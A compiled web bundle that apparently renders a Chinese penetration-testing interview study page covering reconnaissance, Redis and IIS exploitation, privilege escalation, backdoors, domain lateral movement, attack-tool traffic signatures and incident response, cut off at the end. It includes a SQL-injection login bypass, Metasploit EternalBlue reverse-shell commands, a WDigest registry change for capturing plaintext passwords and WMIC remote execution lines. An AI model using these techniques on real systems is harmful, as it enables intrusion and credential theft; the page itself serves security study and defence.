import{_ as i}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as l,c as d,a as s,b as e,d as t,e as a,r as o}from"./app.c527752f.js";const r={},p=a('<p>梳理网络安全知识点为自己查漏补缺。</p><h2 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集" aria-hidden="true">#</a> 信息收集</h2><details class="custom-container details"><summary>你是如何做资产信息收集的？</summary><p>即查找目标所有的暴露面</p><p>1）企业组织架构信息收集（域名、APP和小程序、子公司和对外投资、供应商）</p><p>2）子域名枚举（自己开发工具-被动收集加主动爆破）</p><p>3）IP资产梳理（准确IP全端口、C段常见端口、目标开放服务和Web应用指纹识别）</p><p>4）目录扫描（后台、备份文件、敏感页面、未授权接口）</p><p>5）敏感信息（文档、Github搜源码、Google hacker）</p></details>',3),c={class:"custom-container details"},m=s("summary",null,"如何绕过网站CDN获取真实IP？",-1),u={href:"http://xxx.com",target:"_blank",rel:"noopener noreferrer"},v=s("p",null,"2）解析子域名，或许有没上CDN的",-1),b=s("p",null,"3）让服务器主动发起请求（SSRF漏洞、注册让其发邮件）",-1),g=a(`<details class="custom-container details"><summary>如何判断高交互蜜罐？</summary><p>1）一般蜜罐里面 F12 被禁用（Debug）</p><p>2）网络一直发送HTTP请求给Jsonp</p></details><details class="custom-container details"><summary>只有一个登录框如何渗透测试？</summary><p>1）SQL注入万能密码 ( <code>admin&#39; or 1=1 --</code>)</p><p>2）弱口令爆破</p><p>3）目录扫描，分析JS代码查找敏感信息</p><p>4）目录遍历，<code>Crtl+u</code>查看源码，访问静态文件目录尝试遍历目录</p><p>5）逻辑漏洞（任意用户注册、改返回包绕过前端登录验证）</p></details><details class="custom-container details"><summary>如果给你一个网站你如何判断后端是什么数据库？</summary><p>1）通过开放端口判断</p><p>2）通过网站开发使用的技术栈判断</p><p>3）尝试让网站报数据库语法错误判断</p><p>常见技术栈组合如下</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>PHP + MySQL + Apache
ASP + MSSQL + IIS
JSP + Oracle + Tomcat
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><details class="custom-container details"><summary>Redis未授权访问如何利用，利用条件是什么?</summary><p><strong>利用条件</strong>：</p><blockquote><p>当redis以root账户运行，无密码或者弱密码认证，并且绑定0.0.0.0可非本机访问的情况下；</p></blockquote><p><strong>Linux利用方式</strong></p><blockquote><p>上传SSH公钥登录SSH，原理是在redis中插入一条数据；</p><p>在Web目录写Webshell;</p><p>Crontab定时任务反弹shell；</p><p>利用slave主从复制实现RCE远程命令执行;</p></blockquote><p><strong>Windows利用方式</strong></p><blockquote><p>Web目录写Webshell</p><p>写入启动项（需重启）</p><p>写入MOF（仅限03系统）</p></blockquote><p><strong>防御措施</strong></p><blockquote><p>1、降权运行redis</p><p>2、使用复杂的密码</p><p>3、限制IP禁止外网访问</p><p>4、另外redis默认不生成日志，可以自己配置来生成日志</p></blockquote></details><details class="custom-container details"><summary>redis getshell中什么样的操作比较危险？</summary><p>主从复制getshell的时候全量复制可能会覆盖原有数据。</p></details><details class="custom-container details"><summary>IIS有哪些历史漏洞？</summary><p>1）<strong>IIS 6.0 PUT文件上传漏洞</strong></p><blockquote><p>开启WebDAV服务、网站目录允许来宾用户写入可用IISPutScanner工具上传文件</p></blockquote><p>2）<strong>IIS6.0 解析漏洞</strong></p><blockquote><p><strong>基于文件</strong></p><p>IIS6.0默认不解析<code>;</code>号后面的内容，例如<code>1.asp;.jpg</code>会当成<code>1.asp</code>解析，相当于分号截断。</p><p><strong>基于文件夹</strong></p><p>IIS6.0会将<code>/*.asp/</code>文件夹下的文件当成asp解析。</p></blockquote><p>3）<strong>IIS7.0/7.5 解析漏洞</strong></p><p>IIS7.*在FastCGI运行php的情况下，php默认配置<code>cgi.fix_pathinfo=1</code>，导致在任意文件后面添加<code>/.php</code>，服务器就会解析成php。</p></details><details class="custom-container details"><summary>IIS对应windows系统版本</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Windows Server <span class="token number">2003</span> 			<span class="token comment">#IIS 6.0</span>
Windows Server <span class="token number">2008</span> SP2，SP3	   <span class="token comment">#IIS 7.0 </span>
Windows Server <span class="token number">2008</span> R2 			<span class="token comment">#IIS 7.5 </span>
Windows Server <span class="token number">2012</span> 			<span class="token comment">#IIS 8.0 </span>
Windows Server <span class="token number">2012</span> R2			<span class="token comment">#IIS 8.5 </span>
windows Server <span class="token number">2016</span>				<span class="token comment">#IIS 10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>有哪些解析漏洞？</summary><p><strong>Apache解析漏洞</strong></p><blockquote><p>Apache 是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p><p>如 test.php.rar 会被apache解析成php</p></blockquote><p><strong>Nginx &lt;8.03 空字节代码执行漏洞</strong></p><blockquote><p>影响版本：0.5.,0.6，0.7 &lt;= 0.7.65，0.8 &lt;= 0.8.37</p><p>在图片中嵌入PHP代码然后通过访问，来执行其中的代码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>xxx.jpg%00.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></blockquote></details><details class="custom-container details"><summary>IIOP听说过吗，和什么类似？</summary><p>java RMI通信，也就是远程方法调用，默认是使用jrmp协议，也可以选择IIOP</p></details><details class="custom-container details"><summary>Java/PHP反序列化产生原因，如何防御？</summary><p>由于Java序列化机制的特殊性质，攻击者可以在序列化和反序列化的过程中注入恶意代码</p><ol><li>不受信任的数据来源：如果应用程序接受来自不受信任的数据源（例如网络输入或文件输入）</li><li>反序列化过程中缺乏验证：在反序列化对象时，应用程序可能没有对反序列化数据进行验证</li></ol><p>以下是一些可能的防御措施：</p><ol><li>限制应用程序接受数据的来源，避免来自不受信任的数据源的输入</li><li>在反序列化数据时，对数据进行验证，并拒绝不合法的数据</li><li>在序列化和反序列化数据时，使用加密算法加密数据，从而保护数据不被攻击者操纵</li><li>使用安全的Java序列化库，例如Google的Gson，这些库支持反序列化过程中对数据进行验证</li><li>及时更新和修补应用程序和操作系统，以修复已知的安全漏洞和弱点，减少攻击者利用漏洞的机会</li></ol></details><details class="custom-container details"><summary>JNDI注入的原理</summary><p>JNDI(JavaNaming and Directory Interface,Java命名和目录接口)是一组在Java应用中访问命名和目录服务的API，JNDI规范允许我们通过对象的名称来访问这个数据源对象，而该对象可能储存在不同的命名或目录服务中，例如JDBC、LDAP、RMI、DNS、NIS、CORBA。</p><p>其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等</p><p>JNDI注入通过远程加载远程class执行恶意代码</p><p>攻击者可以通过构造恶意的JNDI URL（Uniform Resource Locator），将恶意对象注册到JNDI目录服务器中，并在Java应用程序中使用该URL来获取对象，从而导致恶意代码执行。</p></details><details class="custom-container details"><summary>MS17-010 Enternal Blue 这个漏洞你怎么利用？</summary><p>MSF反弹shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>use exploit/windows/smb/ms17_010_eternalblue
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
show targets	<span class="token comment">#修改设置参数</span>
show options	<span class="token comment">#修改设置参数</span>
exploit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="权限提升" tabindex="-1"><a class="header-anchor" href="#权限提升" aria-hidden="true">#</a> 权限提升</h2><details class="custom-container details"><summary>如何提升系统权限？</summary><p><strong>Windows</strong></p><blockquote><p>1）查看系统补丁，用类似 CVE-2020-0787 这些系统漏洞提权</p><p>2）BypassUAC</p><p>3）烂土豆提权</p></blockquote><p><strong>Linux</strong></p><blockquote><p>Sudo滥用提权</p><p>SUID提权</p><p>内核漏洞提权（脏牛）</p></blockquote></details><details class="custom-container details"><summary>简单说下烂土豆提权提权原理？</summary><ul><li>烂土豆使用NTLM（NT LAN Manager）身份验证协议进行远程过程调用（RPC）连接。</li><li>烂土豆会创建一个伪造的RPC服务，并设置服务的安全描述符为允许系统管理员级别的权限。然后创建一个DCOM（Distributed Component Object Model）对象，并连接到伪造的RPC服务。</li><li>Windows会检查连接的安全描述符，由于设置了管理员级别的权限，Windows会将DCOM对象连接的进程升级为管理员权限，从而实现提权。</li></ul></details><details class="custom-container details"><summary>UAC是如何进行鉴权校验的? BypassUAC的常见方法有哪些?</summary><p>UAC通过访问控制列表(ACL)实现用户访问控制，ACL决定了拥有何种权限的用户/进程能访问某资源。</p><p>1）利用白名单程序</p><p>2）DLL劫持</p><p>3）COM劫持</p></details><details class="custom-container details"><summary>请简述脏牛漏洞提权的原理？</summary><p>该漏洞的原因是get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，</p><p>可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。</p><p>当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，</p><p>如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root的目的。</p></details><details class="custom-container details"><summary>MySQL提权的方式有哪些？利用条件？</summary><p><strong>MOF提权</strong></p><p>root账户</p><p>03系统</p><p>mof目录可写</p><p>secure_file_priv为空表示对mysql导入导出不做限制 在my.ini可以配置</p><p><strong>UDF提权</strong></p><p>Create function 调用udf.dll，以系统权限执行系统命令</p></details><details class="custom-container details"><summary>SQL Server提权的方式有哪些？</summary><div class="language-mssql line-numbers-mode" data-ext="mssql"><pre class="language-mssql"><code>xp_cmdshell
SP_OACreate
Openrowset沙盒
SQL Server代理执行计划任务
CLR公共语言运行时通过.NET程序调用powershell执行系统命令
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>假设SQL Server为sa权限，如何不通过xp_cmdshell执行系统命令？</summary><p>1）有.net环境可以使用SQL Server的CLR（Common Language Runtime）功能创建一个CLR存储过程，其中使用C#编写的代码调用PowerShell来执行所需的系统命令。</p><p>2）安装了SQL Server Agent，可以创建一个作业（Job），在作业中设置步骤以执行所需的系统命令。使用<code>sp_start_job</code>存储过程来启动该作业，从而执行系统命令。</p></details><h2 id="权限维持" tabindex="-1"><a class="header-anchor" href="#权限维持" aria-hidden="true">#</a> 权限维持</h2><details class="custom-container details"><summary>Linux有哪几种后门实现方式？</summary><p>ssh软链接后门</p><p>增加超级用户帐号</p><p>SSH公钥登陆</p><p>Crontab定时任务</p><p>Rootkit工具包</p></details><details class="custom-container details"><summary>ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?</summary><p><code>/etc/pam.d/su</code> 中的<code>pam_rootok.so</code>使得UID为0的用户可以无需密码直接通过认证。</p><p>当通过特定端口连接SSH后，软链接文件为<code>/tmp/su</code>，应用就会寻找到<code>/etc/pam.d/su</code>作为配置文件，从而可以实现无密码登陆。</p></details><details class="custom-container details"><summary>Windows有哪几种后门实现方式？</summary><p>映像劫持Shift</p><p>添加影子账户</p><p>木马加入开机启动项</p></details><h2 id="通道构建" tabindex="-1"><a class="header-anchor" href="#通道构建" aria-hidden="true">#</a> 通道构建</h2><details class="custom-container details"><summary>常用哪些方式构建内网通道？</summary><p>SSH高权限端口转发</p><p>FRP反向代理</p></details><details class="custom-container details"><summary>目标不出网的情况下如何做内网通道，是什么原理？</summary><p>Neo-reGeorg正向代理</p><p>其原理为在本地建立监听，提供socket服务，将数据通过http/https传递到webshell上做中转</p><p>服务端通信原理是通过session来接收socket转发收到的内容</p></details><h2 id="横向渗透" tabindex="-1"><a class="header-anchor" href="#横向渗透" aria-hidden="true">#</a> 横向渗透</h2><details class="custom-container details"><summary>你有一个webshell但无法执行系统命令，无法上传，怎么进行内网渗透？</summary><p>假设这两个问题无法解决。</p><p>1）翻阅配置文件查找敏感信息</p><p>2）再通过漏洞点上传一个正向代理的webshell，尝试向内网其它脆弱资产横向移动</p></details><details class="custom-container details"><summary>你横向渗透的常用手法有哪些？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>抓hash和明文密码 -<span class="token operator">&gt;</span> hash传递和内网密码喷洒
翻阅配置文件查找敏感信息
获取历史凭证（history、浏览器、RDP连接凭证、xshell连接凭证）
弱口令
Web应用漏洞
系统漏洞ms17010
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>目标只开了139端口能否利用永恒之蓝？</summary><p>需要使用445端口的SMB文件共享服务，以ms17_010为例我试过关闭445是不行的</p></details><details class="custom-container details"><summary>内网渗透怎么获取服务器账号密码？</summary><p>1）mimkatz抓hash和明文密码</p><p>2）翻阅配置文件，历史记录</p><p>3）密码喷洒：同密码重复利用</p><p>4）暴力破解弱口令</p></details><details class="custom-container details"><summary>Mimikatz抓密码原理？</summary><ol><li><strong>进程注入</strong>： <ul><li>Mimikatz通过利用Windows进程注入技术，将自身的代码注入到<code>lsass.exe</code>进程中</li></ul></li><li><strong>抓取凭据</strong>： <ul><li>一旦Mimikatz成功地注入到目标进程中，它就可以访问该进程的内存空间，以获取其中保存的凭据信息。lsass.exe进程是Windows操作系统中的身份验证进程，负责处理用户登录的凭据。</li></ul></li></ol><p>如果目标用户在线则能提取到明文密码，或者提取到NTLM哈希值去离线解密。</p></details><details class="custom-container details"><summary>不用mimikatz怎么抓明文密码？</summary><p>DumpMinitool或者注册表导出hash，然后彩虹表离线破解。</p><p>彩虹表是通过预先计算大量的密码和其对应的哈希值，并将它们存储在一个巨大的数据表中，以便在需要时快速进行哈希值的反查找。</p></details><details class="custom-container details"><summary>Server 12限制了抓明文密码，怎么绕过？</summary><p>改注册表开启Wdigest+rundll32强制锁屏+等管理员重新登录即可抓</p></details><details class="custom-container details"><summary>哪个补丁导致了mimikatz无法利用，如何绕过?</summary><p>原理是从lsass进程抓取内存</p><p>Windows Server 2012 之后的版本默认关闭<code>Wdigest</code>，无法从内存中获取明文密码。</p><p>2012之前的版本安装了<code>KB2871997</code>，同样无法获取明文密码</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>开启和关闭Wdigest的命令

<span class="token comment">#开启，值为1</span>
reg <span class="token function">add</span> HKLM<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>SecurityProviders<span class="token punctuation">\\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">1</span> /f

<span class="token comment">#关闭，值为0</span>
reg <span class="token function">add</span> HKLM<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>SecurityProviders<span class="token punctuation">\\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">0</span> /f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>有哪些横向执行命令的方法？</summary><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>psexec
wmic
net use共享+计划任务+type命令
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>psexec的底层实现原理是什么?</summary><p>命名管道连接SMB共享</p></details><details class="custom-container details"><summary>psexec和wmic的区别？</summary><p>psexec会记录大量日志，wmic不会记录下日志，更为隐蔽。</p></details><details class="custom-container details"><summary>横向渗透中，wmic如何构造有回显的命令执行?</summary><p>WMIC进程调用把命令执行结果重定向到一个文本文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#WMIC进程调用</span>
WMIC /Node:192.168.1.120 /user:administrator /password:admin123 Process Call Create <span class="token string">&quot;cmd /c whoami &gt; C:\\Users\\Public\\Videos\\out.txt&quot;</span>

<span class="token comment">#利用type查看结果</span>
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.159.130<span class="token punctuation">\\</span>c$
<span class="token builtin class-name">type</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.120<span class="token punctuation">\\</span>c$<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>Public<span class="token punctuation">\\</span>Videos<span class="token punctuation">\\</span>out.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>桌面有管理员会话，想要做会话劫持怎么做？</summary><p>首先提权到system权限，能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#查询已登陆的用户会话</span>
quser

<span class="token comment">#劫持用户会话</span>
tscon ID /dest:console
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>你入侵了一台非域成员主机，如何快速定位到其它域成员主机？</summary><p>PowerView 枚举域内登陆的用户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Import-Module .<span class="token punctuation">\\</span>powerview.ps1
Invoke-UserHunter
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何查询域管登录过的机器，查询原理又是什么?</summary><p>定位域管两种手段：日志和会话。</p><p>psloggedon工具查询，原理是检测注册表中HKEY_USERS的key值、调用了NetSessionEnum的API来判断谁登录过哪台机器。</p></details><details class="custom-container details"><summary>域控开放的常见端口有哪些？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">53</span>	<span class="token comment">#DNS Server</span>
<span class="token number">88</span>	<span class="token comment">#KDC 密钥分发中心</span>
<span class="token number">389</span>	<span class="token comment">#LDAP 轻量目录访问协议</span>
<span class="token number">445</span>	<span class="token comment">#SMB</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何查询域之间的信任关系？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nltest /domain_trusts
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些?</summary><p>哈希传递（PTH）、票据传递、金银票后门</p></details><details class="custom-container details"><summary>你是域成员，如何拿到域控制器？</summary><p>定位域控 net time /domain、 net group &quot;domain controllers&quot; /domain</p><p>1）通过抓取域管登陆服务器的hash（不断抓HASH+PTH攻击）</p><p>2）通过运维人员不恰当的密码管理（弱口令、Wiki系统等记录域高权限账户）</p><p>3）通过委派来获取域控权限</p><p>4）通过NTLM中继</p><p>5）通过域控相关的漏洞（ms14068、Zerologon、NoPAC、Print Spooler）</p></details><details class="custom-container details"><summary>内网渗透拿到了域控制器怎么维持权限？</summary><p>黄金票据后门</p><p>通过卷影拷贝导出ntds.dit获取域内所有用户hash</p></details><details class="custom-container details"><summary>黄金票据是什么？</summary><p>在域中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。</p><p>TGT票据，因为它是由域账号<code>krbtgt</code>的<code>NTLM Hash</code>加密和签名的</p><p>伪造TGT票据跳过kerberos认证服务器认证过程获取任意server票据</p></details><details class="custom-container details"><summary>Wndows内网中NTLM协议认证过程？</summary><ol><li><strong>客户端请求认证</strong>： 用户在客户端系统上尝试访问资源（例如共享文件夹）。客户端会发送一个认证请求到服务器。</li><li><strong>服务器返回随机数</strong>： 服务器收到认证请求后，会生成一个随机数（称为Challenge），然后将其发送回给客户端。</li><li><strong>客户端响应</strong>： 客户端接收到服务器发送的Challenge后，会使用用户的密码和Challenge进行一系列计算，生成一个值，这个值被称为“Response”。</li><li><strong>客户端发送响应给服务器</strong>： 客户端将生成的Response发送回服务器作为答复。</li><li><strong>服务器验证</strong>： 服务器收到客户端发送的Response后，会使用存储在服务器上的用户密码的散列值来执行相同的计算。然后，服务器会比较客户端计算得到的Response和自己计算得到的Response是否匹配。</li><li><strong>服务器向域控制器验证</strong>： 如果服务器上的密码散列与客户端计算得到的Response匹配，服务器会向域控制器发送请求，请求确认该用户的密码是正确的。</li><li><strong>域控制器验证</strong>： 域控制器收到验证请求后，会将存储在Active Directory中的用户密码散列值与服务器发送的Response进行比较，以确认密码是否正确。如果一致，域控制器会向服务器发送确认信息。</li><li><strong>服务器授权访问</strong>： 一旦域控制器确认用户的密码正确无误，服务器会授予用户访问请求资源的权限。</li></ol></details><details class="custom-container details"><summary>NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制?</summary><p>攻击场景：Pass-the-Hash (PtH) 、Pass-the-Ticket (PtT)</p><p>限制：SMB签名禁用</p></details><details class="custom-container details"><summary>Windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么?</summary><p>SID安全标识符（Security Identifier），是Windows操作系统用于标识用户、组和计算机的唯一标识符</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wmic useraccount get Caption,sid
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>SID History攻击是一种利用Windows Active Directory中对象的SID历史属性进行攻击的方法。</p><p>当域内的对象（如用户、组）进行跨域移动时，会保留其原始的SID，并在目标域中创建一个新的SID。同时，原始SID将添加到目标域对象的SID历史属性中。这是为了确保跨域移动的对象能够继续访问先前授予其权限的资源。攻击者可以利用SID History属性来进行横向渗透和提权。</p><p>攻击原理如下：</p><ol><li><strong>获取目标域对象的SID History：</strong> 攻击者首先需要获取目标域中感兴趣的用户或组的SID History属性。这可能涉及到信息收集和对目标域探测。</li><li><strong>在攻击域中伪造SID：</strong> 接下来，攻击者会在自己控制的域中创建一个与目标域中用户或组的SID History相匹配的伪造SID。</li><li><strong>构造访问令牌：</strong> 攻击者使用伪造的SID构造一个访问令牌（access token）。访问令牌是用于表示身份和权限的数据结构，在Windows中用于控制对资源的访问。</li><li><strong>尝试访问目标资源：</strong> 使用伪造的访问令牌，攻击者尝试访问目标域中的资源。如果目标域没有适当的安全措施来防止SID History攻击，那么攻击者可能会成功获取资源的访问权限。</li></ol><p>SID History攻击的防御措施包括：</p><ul><li><strong>限制SID History的使用：</strong> 最好限制SID History的使用，仅在必要时才允许使用它，以减少横向渗透的风险。</li><li><strong>监控事件日志：</strong> 监控Windows事件日志，特别是关于安全主体的事件，可以帮助及早发现潜在的SID History攻击。</li><li><strong>强化域边界：</strong> 在网络边界和域边界实施安全策略，限制域之间的通信，可以帮助减少横向渗透的可能性。</li><li><strong>定期审查权限：</strong> 定期审查和清理域中的权限，删除不再需要的SID History，以及细化权限设置，可以提高安全性。</li></ul></details><h2 id="研判分析" tabindex="-1"><a class="header-anchor" href="#研判分析" aria-hidden="true">#</a> 研判分析</h2><details class="custom-container details"><summary>100台机器如何判断哪台被log4j攻击成功？</summary><p>1、确认资产属性，哪部分使用了log4j的相关组件，排除无关联资产</p><p>2、检索攻击成功的事件日志，查看响应体里的内容是否命令执行了或带有敏感数据</p></details><details class="custom-container details"><summary>全流量设备没有告警，没有样本，怎么找到攻击样本？</summary><p>1）流量不全或者设备规则库未覆盖到相关的资产</p><p>2）可能攻击本来就是没有文件落地，根本没有样本</p><p>3）在其它设备上或者失陷主机上查看应用请求日志</p></details><details class="custom-container details"><summary>如何判断被搭建了什么隧道</summary><p>1）ICMP隧道数据包中DATA 往往大于64 比特，部分隧道工具会显示tun的标志</p><p>2）SOCKS某些隧道存在一些固定16进制特征，或者通过安全设备告警排查</p></details><details class="custom-container details"><summary>如何排查JAVA内存马？</summary><p>1）查看Web日志，filter或者listener类型的内存马，会有页面不存在但是返回200的请求</p><p>2）内存马的Filter是动态注册的，所以在web.xml中可能没有配置</p><p>3）内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。</p></details><h2 id="流量特征" tabindex="-1"><a class="header-anchor" href="#流量特征" aria-hidden="true">#</a> 流量特征</h2><details class="custom-container details"><summary>CobaltStrike</summary><p>1）checksum8</p><p>运行staging模式的pe文件，会向指定服务器的checksum8路径发起请求来下载stage。</p><p>stage是包含了很多功能的代码块，用于接受和执行控制端的任务并返回结果。</p><p>其中HTTP请求路径符合checksum8规则，路径的ascii之和与256取余计算值等于92或93。</p><p>32位后门是92，64位后门是93。</p><p>2）JA3/JA3s</p><p>ja3和ja3s分别代表tls握手阶段的client-hello、server-hello的数据集合计算出的哈希值（md5），相同版本相同系统下指纹相同，该特征与操作系统、cobaltstrike版本有关，profile文件无法对其修改。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>72a589da586844d7f0818ce684948eea
fd4bc6cea4877646ccd62f0792ec0b62
72a589da586844d7f0818ce684948eea
652358a663590cfc624787f06b82d9ae
4d93395b1c1b9ad28122fb4d09f28c5e
a0e9f5d64349fb13191bc781f81f42e1
ae4edc6faf64d08308082ad26be60767
fd4bc6cea4877646ccd62f0792ec0b62
b742b407517bac9536a77a7b0fee28e9
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Metasploit</summary><p>1）默认使用4444端口作为反向连接端口</p><p>2）数据包通常包含特定字符串(&quot;meterpreter&quot;、&quot;revshell&quot;等)</p></details><details class="custom-container details"><summary>FRP</summary><p>1）Frpc 在连接认证 Frps 的时候，会进行三次握手，会把 Frp 的版本信息发给 frps 进行认证</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Version、Arch、User、Privilege_key 等字段
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>NPS</summary><p>1）nps的认证过程三次握手客户端向服务器发送两次version的值和一次TST字段</p></details><details class="custom-container details"><summary>蚁剑</summary><p>每个请求体都存在以 @ini_set(&quot;display_errors&quot;,&quot;0&quot;); @set_time_limit(0)开头。</p><p>并且响应体的返回结果是base64编码发混淆字符</p></details><details class="custom-container details"><summary>哥斯拉</summary><p>1）payload特征</p><p>jsp会出现xc,pass字符和Java反射，base64加解码等特征，php，asp则为普通的一句话木马</p><p>2）Cookie</p><p>Cookie字段，最后一个Cookie的值出现;（尾值出现分号）</p></details><details class="custom-container details"><summary>冰蝎</summary><p>1）冰蝎1.0</p><p>有一个密钥协商过程，这个过程是明文传输，并且有两次流量，用来校验</p><p>2）冰蝎2.0</p><p>使用 AES加密 + base64编码 ，AES使用动态密钥对通信进行加密，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</p><p>因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</p><p>3）冰蝎3.0</p><p>使用 AES加密 + base64编码 ,取消了2.0的动态获取密钥，使用固定的连接密钥，AES加密的密钥为webshell连接密码的MD5的前16位，默认连接密码是&quot;rebeyond&quot;(即密钥是md5(&#39;rebeyond&#39;)[0:16]=e45e329feb5d925b)。</p><p>进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</p><p>3.0连接jsp的webshell的请求数据包中的content-type字段常见为application/octet-stream。</p><p>4）冰蝎4.0</p><p>提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。</p><p>4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。</p><p>与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</p><p>连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</p><p>使用长连接，避免了频繁的握手造成的资源开销。</p><p>默认情况下，请求头里会带有 Connection：Keep-Alive</p><p>有固定的请求头和响应头</p><p>请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M</p><p>响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p><p>默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。</p></details><h2 id="应急响应" tabindex="-1"><a class="header-anchor" href="#应急响应" aria-hidden="true">#</a> 应急响应</h2><details class="custom-container details"><summary>一台服务器被植入Webshell怎么办？</summary><p>1、清除Webshell：扫描网站目录，查找Webshell的位置，并删除</p><p>2、Web日志审计：根据Webshell创建时间，分析可疑的Web访问，找到漏洞位置，复现漏洞</p><p>3、修复漏洞，检查系统日志查看其它恶意活动，对服务器和Web应用进行安全加固</p></details><details class="custom-container 